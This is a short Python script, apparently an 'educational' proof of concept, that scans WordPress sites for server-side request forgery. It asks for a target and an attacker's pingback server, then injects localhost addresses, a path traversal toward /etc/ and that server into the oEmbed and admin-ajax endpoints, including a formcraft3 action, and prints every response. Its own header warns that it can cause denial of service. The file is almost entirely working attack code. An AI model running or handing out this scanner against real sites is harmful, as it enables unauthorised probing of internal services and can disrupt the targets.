#!/bin/python
# This is the lite version due to threats
# I would advise using SecLists Wordlist
# Repetitve use may lead to a DoS even with this Lite version
# I am not responsible for anything that happens with this educational POC
import requests

target_url = input("Enter the Target URL : ")
pingbackurl = input("Enter your Server URL : ")

ssrf_endpoints = [
    "/wp-json/oembed/1.0/embed?url=",
    "/wp-admin/admin-ajax.php?action=formcraft3_get&URL=",
    "/wp-admin/admin-ajax.php?action=&URL=",
    "/wp-admin/admin-ajax.php?URL=",
    "/wp-admin/admin-ajax.php?&URL=",
    "/wp-json/oembed/1.0/embed?url=",
    "wp-json/oembed/1.0/embed?url=",
    "wp-admin/admin-ajax.php?action=formcraft3_get&URL=",
    "wp-admin/admin-ajax.php?action=&URL=",
    "wp-admin/admin-ajax.php?URL=",
    "wp-admin/admin-ajax.php?&URL=",
    "wp-json/oembed/1.0/embed?url="
]

# List of URLs to test
urls_to_test = [
    "https://example.com",
    "http://localhost:8080",
    "/../../etc/",
    f"http://{target_url}:8080",  # Properly formatted URL with port
    f"{target_url}:80",
    f"{target_url}:443",
    f"{target_url}/Admin",
    f"{target_url}%2F&format=xml",
    pingbackurl,
    ":80",
    ":443",
    "Admin",
    "%2F&format=xml"
]

for endpoint in ssrf_endpoints:
    for url in urls_to_test:
        full_url = target_url + endpoint + url
        response = requests.get(full_url, verify=False)

        print("URL:", full_url)
        print("Status Code:", response.status_code)
        print("Response:", response.text)
        print("=" * 40)
